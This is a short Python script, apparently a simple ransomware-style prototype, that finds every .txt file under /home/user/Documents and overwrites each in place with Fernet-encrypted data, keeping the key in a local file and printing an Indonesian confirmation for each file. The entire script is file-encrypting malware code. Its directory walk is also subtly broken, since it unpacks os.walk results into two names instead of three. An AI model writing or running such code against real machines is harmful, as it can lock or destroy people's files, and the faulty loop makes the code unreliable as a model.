import os
from cryptography.fernet import Fernet

def generate_key ():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)


def load_key ():
    return open("key.key", "rb").read()


def encrypt_file (directoryPath):
    key = load_key()
    f = Fernet(key)

    with open(directoryPath, "rb") as file:
        file_data = file.read()
        encrypted_data = f.encrypt(file_data)

    with open(directoryPath, "wb") as file :
        file.write(encrypted_data)

def get_all_txt_files(directory):
    txt_files = []

    for root,files in os.walk(directory):
        for file in files:
            if file.endswith(".txt"):
                txt_files.append(os.path.join(root, file))
    return txt_files

targetDirectory = "/home/user/Documents"

if not os.path.exists("key.key"):
    generate_key()
txt_files = get_all_txt_files(targetDirectory)

for txt_file in txt_files:
    encrypt_file(txt_file)
    print(f"File '{txt_file}' telah dienkripsi.")

